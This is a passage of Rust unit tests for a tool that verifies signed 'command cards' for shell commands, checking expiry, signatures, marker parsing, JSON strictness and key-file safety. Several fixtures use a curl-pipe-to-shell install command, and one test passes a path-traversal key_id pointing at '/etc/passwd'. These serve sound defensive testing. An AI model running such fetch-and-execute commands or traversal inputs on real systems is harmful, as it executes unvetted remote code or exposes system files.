        assert_eq!(findings[0].rule_id, RuleId::CommandCardUnverified);
        assert_ne!(findings[0].rule_id, RuleId::CommandCardVerified);
        assert_eq!(findings[0].severity, Severity::Info);
        assert!(findings[0].description.contains("untrusted key"));
    }

    #[test]
    fn expired_card_does_not_verify() {
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);
        let mut card = sample_card();
        card.expires = "2020-01-01".to_string();
        card.sign(&secret).unwrap();

        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh",
            dir.path(),
            today(),
        );
        assert_eq!(outcome, CardOutcome::Unverified(VerifyFailure::Expired));
        let findings = findings_for_outcome(&outcome);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].description.contains("expired"));
    }

    /// A SUPPLIED-but-unsigned card must be VISIBLE: `findings_for_outcome` runs
    /// only after a card ref was resolved+read, so `Unsigned` belongs in
    /// audit/JSON as an Info `CommandCardUnverified`, not dropped. (The card-LESS
    /// command stays silent via the engine's early return.)
    #[test]
    fn unsigned_supplied_card_is_visible() {
        let dir = tempfile::tempdir().unwrap();
        let card = sample_card(); // supplied, but never signed
        let outcome = evaluate_card(
            &card,
            "curl -fsSL https://example.com/install.sh | sh",
            dir.path(),
            today(),
        );
        assert_eq!(outcome, CardOutcome::Unverified(VerifyFailure::Unsigned));
        // Exactly one Info CommandCardUnverified — visible, never tagged verified.
        let findings = findings_for_outcome(&outcome);
        assert_eq!(
            findings.len(),
            1,
            "a supplied unsigned card must emit exactly one finding"
        );
        assert_eq!(findings[0].rule_id, RuleId::CommandCardUnverified);
        assert_eq!(findings[0].severity, Severity::Info);
        assert_ne!(
            findings[0].rule_id,
            RuleId::CommandCardVerified,
            "an unsigned card must never be reported as verified"
        );
        assert!(
            findings[0].description.contains("not signed")
                || findings[0].description.contains("could not be verified"),
            "note must explain the card was unsigned/unverified; got: {}",
            findings[0].description
        );
    }

    #[test]
    fn find_card_comment_local_path() {
        let input = "# tirith-card: ./install-card.json\ncurl https://example.com/x.sh | sh";
        assert_eq!(
            find_card_comment(input),
            Some(CardRef::LocalPath("./install-card.json".to_string()))
        );
    }

    #[test]
    fn find_card_comment_url_is_remote_not_fetched() {
        let input =
            "# tirith-card: https://example.com/foo.json\ncurl https://example.com/x.sh | sh";
        assert_eq!(
            find_card_comment(input),
            Some(CardRef::RemoteUrl(
                "https://example.com/foo.json".to_string()
            ))
        );
    }

    #[test]
    fn find_card_comment_absent() {
        assert_eq!(
            find_card_comment("curl https://example.com/x.sh | sh"),
            None
        );
    }

    #[test]
    fn find_card_comment_flexible_whitespace_matches_tier1() {
        // tier-1 is `#\s*tirith-card:`, so the parser MUST accept the same
        // shapes or the card is silently dropped after passing tier-1.
        let expected = Some(CardRef::LocalPath("./c.json".to_string()));
        // No space after `#`.
        assert_eq!(
            find_card_comment("#tirith-card: ./c.json\necho hi"),
            expected
        );
        // Two spaces after `#`.
        assert_eq!(
            find_card_comment("#  tirith-card: ./c.json\necho hi"),
            expected
        );
        // Canonical single space (sanity).
        assert_eq!(
            find_card_comment("# tirith-card: ./c.json\necho hi"),
            expected
        );
        // The strip step must treat the same shapes as markers, else a surviving
        // marker would falsely mismatch the signed command.
        assert_eq!(
            strip_card_comment_lines("#tirith-card: ./c.json\necho hi"),
            "echo hi"
        );
        assert_eq!(
            strip_card_comment_lines("#  tirith-card: ./c.json\necho hi"),
            "echo hi"
        );
    }

    #[test]
    fn card_marker_whitespace_handling_is_shell_significant() {
        // The marker/prelude parsers restrict whitespace to the SHELL-SIGNIFICANT
        // set for lockstep with the `command_matches` gate. A U+00A0-padded
        // marker must NOT be recognized (else the strip could mutate a command
        // the gate would never have trimmed equal).
        let nbsp = '\u{A0}';

        // Leading U+00A0 before `#`: NOT a marker.
        let lead_nbsp = format!("{nbsp}# tirith-card: ./c.json\necho hi");
        assert_eq!(
            find_card_comment(&lead_nbsp),
            None,
            "U+00A0 before `#` must not be treated as ASCII indentation"
        );
        assert!(!has_card_comment_prelude(&lead_nbsp));
        // No marker recognized → input left verbatim, not stripped.
        assert_eq!(strip_card_comment_lines(&lead_nbsp), lead_nbsp);
        assert_eq!(prelude_end_offset(&lead_nbsp), 0);

        // U+00A0 between `#` and the keyword: also NOT a marker.
        let gap_nbsp = format!("#{nbsp}tirith-card: ./c.json\necho hi");
        assert_eq!(find_card_comment(&gap_nbsp), None);
        assert!(!has_card_comment_prelude(&gap_nbsp));

        // A line of ONLY Unicode whitespace ends the prelude, so a following
        // marker is command content.
        let unicode_blank_then_marker = format!("{nbsp}\n# tirith-card: ./c.json\necho hi");
        assert_eq!(find_card_comment(&unicode_blank_then_marker), None);
        assert!(!has_card_comment_prelude(&unicode_blank_then_marker));
        assert_eq!(
            strip_card_comment_lines(&unicode_blank_then_marker),
            unicode_blank_then_marker
        );

        // `\x0C` is where `char::is_ascii_whitespace` (counts it) and
        // `is_shell_significant_ws` (does NOT) diverge. It is COMMAND CONTENT, so
        // an `\x0C`-padded line must NOT be a marker or a blank prelude line.
        let ff = '\u{0C}';
        // Leading `\x0C` before `#`: NOT a marker; input left verbatim.
        let lead_ff = format!("{ff}# tirith-card: ./c.json\necho hi");
        assert_eq!(
            find_card_comment(&lead_ff),
            None,
            "a form feed before `#` must not be treated as strippable indentation"
        );
        assert!(!has_card_comment_prelude(&lead_ff));
        assert_eq!(strip_card_comment_lines(&lead_ff), lead_ff);
        assert_eq!(prelude_end_offset(&lead_ff), 0);
        // `\x0C` between `#` and the keyword: also NOT a marker.
        let gap_ff = format!("#{ff}tirith-card: ./c.json\necho hi");
        assert_eq!(find_card_comment(&gap_ff), None);
        assert!(!has_card_comment_prelude(&gap_ff));
        // A line of ONLY `\x0C` ends the prelude, so a following marker is content.
        let ff_blank_then_marker = format!("{ff}\n# tirith-card: ./c.json\necho hi");
        assert_eq!(find_card_comment(&ff_blank_then_marker), None);
        assert!(!has_card_comment_prelude(&ff_blank_then_marker));
        assert_eq!(
            strip_card_comment_lines(&ff_blank_then_marker),
            ff_blank_then_marker
        );

        // Regression guard: ASCII-space/tab-indented markers STILL parse/strip,
        // and an ASCII-blank line before the marker is still prelude padding.
        let expected = Some(CardRef::LocalPath("./c.json".to_string()));
        assert_eq!(
            find_card_comment("  \t# tirith-card: ./c.json\necho hi"),
            expected
        );
        assert!(has_card_comment_prelude(
            "  \t# tirith-card: ./c.json\necho hi"
        ));
        assert_eq!(
            strip_card_comment_lines("  \t# tirith-card: ./c.json\necho hi"),
            "echo hi"
        );
        assert_eq!(
            strip_card_comment_lines("\n# tirith-card: ./c.json\necho hi"),
            "echo hi"
        );
    }

    #[test]
    fn strip_card_comment_lines_removes_only_the_marker() {
        // A leading marker line is stripped; the command survives verbatim.
        let input = "# tirith-card: ./card.json\ncurl -fsSL https://example.com/install.sh | sh";
        assert_eq!(
            strip_card_comment_lines(input),
            "curl -fsSL https://example.com/install.sh | sh"
        );
        // Indented marker (the resolver trims leading whitespace) is also stripped.
        let indented = "   # tirith-card: ./card.json\necho hi";
        assert_eq!(strip_card_comment_lines(indented), "echo hi");
        // No marker → unchanged.
        assert_eq!(strip_card_comment_lines("echo hi"), "echo hi");
        // A `#` comment that is NOT a tirith-card marker is preserved.
        let other = "# just a note\necho hi";
        assert_eq!(strip_card_comment_lines(other), other);
    }

    #[test]
    fn strip_leaves_marker_less_leading_blank_lines_intact() {
        // Leading blank lines with NO marker are part of the command, not
        // transport metadata, so they must NOT be dropped (and the two strip
        // variants must agree).
        assert_eq!(strip_card_comment_lines("\n\necho hi"), "\n\necho hi");
        assert_eq!(prelude_end_offset("\n\necho hi"), 0);
        // The two strip variants must agree on a marker-less input.
        assert_eq!(
            strip_card_comment_lines("\n\necho hi"),
            strip_card_comment_lines_cow("\n\necho hi").as_ref()
        );
        // A single leading blank with no marker is likewise untouched.
        assert_eq!(strip_card_comment_lines("\necho hi"), "\necho hi");

        // But a marker FOLLOWED by blank lines strips the marker AND the
        // transport blanks between it and the command.
        assert_eq!(
            strip_card_comment_lines("# tirith-card: ./c\n\necho hi"),
            "echo hi"
        );
        // A blank line BEFORE the marker is also transport padding (a marker is
        // present in the prelude), so the whole prelude is stripped.
        assert_eq!(
            strip_card_comment_lines("\n# tirith-card: ./c\necho hi"),
            "echo hi"
        );
    }

    #[test]
    fn card_marker_only_parsed_in_leading_prelude_not_heredoc_body() {
        // A `# tirith-card:` AFTER the command starts (here in a heredoc body) is
        // COMMAND CONTENT — must not be parsed as a ref nor stripped, else it
        // would spuriously trip CommandCardMismatch.
        let body_marker = "cat <<'EOF' > script.sh\n# tirith-card: ./evil.json\necho hi\nEOF";
        assert_eq!(
            find_card_comment(body_marker),
            None,
            "a marker inside a heredoc body (after the command starts) is not a card ref"
        );
        assert_eq!(
            strip_card_comment_lines(body_marker),
            body_marker,
            "a marker inside a heredoc body must be preserved verbatim, not stripped"
        );

        // A non-marker `#` first line ends the prelude, so a later marker is
        // command content too.
        let comment_then_marker = "# build script\n# tirith-card: ./c.json\necho hi";
        assert_eq!(find_card_comment(comment_then_marker), None);
        assert_eq!(
            strip_card_comment_lines(comment_then_marker),
            comment_then_marker
        );

        // Sanity: a LEADING marker is still parsed/stripped.
        let leading = "# tirith-card: ./c.json\necho hi";
        assert_eq!(
            find_card_comment(leading),
            Some(CardRef::LocalPath("./c.json".to_string()))
        );
        assert_eq!(strip_card_comment_lines(leading), "echo hi");
    }

    #[test]
    fn heredoc_body_marker_does_not_cause_spurious_mismatch() {
        // CRITICAL end-to-end: a signed card whose `command` is a heredoc
        // CONTAINING `# tirith-card:` in its body must still VERIFY. Before the
        // prelude-scoping fix the body marker was stripped → spurious Mismatch.
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);

        let command = "cat <<'EOF' > out.sh\n# tirith-card: ./inner.json\necho hello\nEOF";
        let mut card = sample_card();
        card.command = command.to_string();
        card.sign(&secret).unwrap();

        // Analyzed input: a LEADING marker plus a command whose body also
        // contains a marker.
        let analyzed_input = format!("# tirith-card: ./card.json\n{command}");
        let stripped = strip_card_comment_lines(&analyzed_input);
        assert_eq!(
            stripped, command,
            "only the leading marker is stripped; the heredoc-body marker survives"
        );

        let outcome = evaluate_card(&card, &stripped, dir.path(), today());
        assert_eq!(
            outcome,
            CardOutcome::Verified,
            "a heredoc command containing `# tirith-card:` in its body must verify, not mismatch"
        );
    }

    #[test]
    fn comment_carried_card_verifies_after_marker_strip() {
        // CRITICAL regression: a signed card referenced via a `# tirith-card:`
        // comment must yield Verified, not Mismatch — the marker must be stripped
        // before the byte-for-byte compare (else a comment-carried card always
        // falsely mismatched).
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);
        let mut card = sample_card(); // command = "curl -fsSL https://example.com/install.sh | sh"
        card.sign(&secret).unwrap();

        // Analyzed input as the engine sees it: marker comment + command.
        let analyzed_input =
            "# tirith-card: ./install-card.json\ncurl -fsSL https://example.com/install.sh | sh";
        let command = strip_card_comment_lines(analyzed_input);

        let outcome = evaluate_card(&card, &command, dir.path(), today());
        assert_eq!(
            outcome,
            CardOutcome::Verified,
            "comment-carried card with a matching command must verify, not mismatch"
        );
        let findings = findings_for_outcome(&outcome);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandCardVerified);
    }

    #[test]
    fn crlf_multiline_command_carried_card_verifies_without_normalization() {
        // Regression: a CRLF-authored multi-line command via a CRLF-terminated
        // prelude must still VERIFY. The old `lines()` + `join("\n")` strip
        // normalized CRLF→LF and falsely Mismatched.
        let dir = tempfile::tempdir().unwrap();
        let (secret, pubkey) = generate_keypair().unwrap();
        write_trusted_key(dir.path(), &pubkey);

        // A genuine multi-line command with Windows CRLF line endings.
        let command = "cat <<'EOF' > out.sh\r\necho one\r\necho two\r\nEOF";
        let mut card = sample_card();
        card.command = command.to_string();
        card.sign(&secret).unwrap();

        // Analyzed input: a CRLF-terminated prelude marker, then the CRLF body.
        let analyzed_input = format!("# tirith-card: ./card.json\r\n{command}");

        // The strip preserves the body byte-for-byte (CRLF intact).
        let stripped = strip_card_comment_lines(&analyzed_input);
        assert_eq!(
            stripped, command,
            "only the leading marker is stripped; the CRLF body is preserved verbatim"
        );
        assert!(
            stripped.contains("\r\n"),
            "CRLF must NOT be normalized to LF; got {stripped:?}"
        );

        let outcome = evaluate_card(&card, &stripped, dir.path(), today());
        assert_eq!(
            outcome,
            CardOutcome::Verified,
            "a CRLF-authored multiline card must verify (no CRLF→LF normalization)"
        );

        // The Cow form (engine hot path) must reach the SAME stripped bytes.
        let cow = strip_card_comment_lines_cow(&analyzed_input);
        assert_eq!(cow.as_ref(), command, "cow strip must also preserve CRLF");
    }

    #[test]
    fn json_roundtrip_preserves_fields() {
        let (secret, _pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.script_sha256 = Some(sha256_hex(b"#!/bin/sh\necho hi\n"));
        card.sign(&secret).unwrap();
        let json = card.to_json_pretty().unwrap();
        let parsed = Card::from_json(json.as_bytes()).unwrap();
        assert_eq!(parsed, card);
    }

    #[test]
    fn unknown_json_fields_are_rejected() {
        // A signed card is an attestation, so `from_json` must REJECT any field
        // not in the struct — else it would ride outside the attested boundary.
        let extra_top = r#"{
            "command": "echo hi",
            "expires": "2026-08-01",
            "evil_extra": "smuggled"
        }"#;
        assert!(
            Card::from_json(extra_top.as_bytes()).is_err(),
            "an unknown top-level field must fail to deserialize"
        );
        // Unknown field inside the signature block is rejected too.
        let extra_sig = r#"{
            "command": "echo hi",
            "expires": "2026-08-01",
            "signature": { "algo": "ed25519", "key_id": "00", "value": "00", "x": 1 }
        }"#;
        assert!(
            Card::from_json(extra_sig.as_bytes()).is_err(),
            "an unknown field in the signature block must fail to deserialize"
        );
        // The same card WITHOUT the extra fields still parses (no false rejection).
        let clean = r#"{ "command": "echo hi", "expires": "2026-08-01" }"#;
        assert!(Card::from_json(clean.as_bytes()).is_ok());
    }

    #[test]
    fn unknown_algo_fails_at_deserialize() {
        // `algo` is a closed enum, so `algo: "none"` (or any non-ed25519 /
        // wrong-casing value) FAILS to parse before any verify logic runs.
        let bad = r#"{
            "command": "x",
            "expires": "2026-08-01",
            "signature": { "algo": "none", "key_id": "00", "value": "00" }
        }"#;
        assert!(
            Card::from_json(bad.as_bytes()).is_err(),
            "algo: none must fail to deserialize"
        );
        // Casing must not slip through either.
        let bad_case = bad.replace("\"none\"", "\"ED25519\"");
        assert!(
            Card::from_json(bad_case.as_bytes()).is_err(),
            "algo: ED25519 (wrong casing) must fail to deserialize"
        );
        // The canonical lowercase form parses.
        let good = bad.replace("\"none\"", "\"ed25519\"");
        assert!(Card::from_json(good.as_bytes()).is_ok());
    }

    #[test]
    fn signed_card_algo_is_ed25519_enum() {
        let (secret, _pubkey) = generate_keypair().unwrap();
        let mut card = sample_card();
        card.sign(&secret).unwrap();
        assert_eq!(
            card.signature.as_ref().unwrap().algo,
            SignatureAlgo::Ed25519
        );
        // Round-trips through JSON as the lowercase string.
        let json = card.to_json_pretty().unwrap();
        assert!(json.contains("\"algo\": \"ed25519\""), "got {json}");
    }

    #[test]
    fn load_trusted_pubkey_rejects_traversal_key_id() {
        let dir = tempfile::tempdir().unwrap();
        // A non-hex key_id (path traversal attempt) must be refused outright.
        assert!(load_trusted_pubkey(dir.path(), "../../etc/passwd").is_none());
        assert!(load_trusted_pubkey(dir.path(), "").is_none());
    }

    #[test]
    fn load_trusted_pubkey_accepts_hex_and_base64() {
        use base64::Engine;
        let (_secret, pubkey) = generate_keypair().unwrap();
        let key_id = key_id_for_pubkey(&pubkey);

        let hex_dir = tempfile::tempdir().unwrap();
        std::fs::write(
            hex_dir.path().join(format!("{key_id}.pub")),
            hex_encode(&pubkey),
        )
        .unwrap();
        assert_eq!(load_trusted_pubkey(hex_dir.path(), &key_id), Some(pubkey));

        let b64_dir = tempfile::tempdir().unwrap();
        let b64 = base64::engine::general_purpose::STANDARD.encode(pubkey);
        std::fs::write(b64_dir.path().join(format!("{key_id}.pub")), b64).unwrap();
        assert_eq!(load_trusted_pubkey(b64_dir.path(), &key_id), Some(pubkey));
    }

    #[test]
    fn load_trusted_pubkey_rejects_mislabeled_file() {
        // A file named key_id A but containing key B must not load.
        let dir = tempfile::tempdir().unwrap();
        let (_s1, key_a) = generate_keypair().unwrap();
        let (_s2, key_b) = generate_keypair().unwrap();
        let id_a = key_id_for_pubkey(&key_a);
        std::fs::write(dir.path().join(format!("{id_a}.pub")), key_b).unwrap();
        assert!(load_trusted_pubkey(dir.path(), &id_a).is_none());
    }

    /// A FIFO at the `<key_id>.pub` path must NOT hang and must yield no key:
    /// `read_regular_capped` opens O_NONBLOCK and rejects it via fstat. Unix-only.
    #[cfg(unix)]
    #[test]
    fn load_trusted_pubkey_fifo_does_not_hang_and_yields_none() {
        use std::ffi::CString;
        let dir = tempfile::tempdir().unwrap();
        let (_secret, pubkey) = generate_keypair().unwrap();
        let key_id = key_id_for_pubkey(&pubkey);
        let key_path = dir.path().join(format!("{key_id}.pub"));
        let c_path = CString::new(key_path.as_os_str().to_str().unwrap()).unwrap();
        if unsafe { libc::mkfifo(c_path.as_ptr(), 0o600) } != 0 {
            eprintln!("skipping: mkfifo unsupported here");
            return;
        }
        // Must complete promptly and return no key (a blocking read would hang).
        assert!(
            load_trusted_pubkey(dir.path(), &key_id).is_none(),
            "a FIFO key file must yield no key, not block"
        );
    }

    /// An oversized `.pub` file is refused by the read cap, not buffered. Lookup
    /// yields `None`.
    #[test]
    fn load_trusted_pubkey_oversized_file_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let (_secret, pubkey) = generate_keypair().unwrap();
        let key_id = key_id_for_pubkey(&pubkey);
        // Far larger than the cap (valid hex, so size — not content — rejects it).
        let oversized = "a".repeat((TRUSTED_PUBKEY_READ_CAP as usize) + 1);
        std::fs::write(dir.path().join(format!("{key_id}.pub")), oversized).unwrap();
        assert!(
            load_trusted_pubkey(dir.path(), &key_id).is_none(),
            "an oversized key file must be refused by the cap, not read"
        );
    }
}
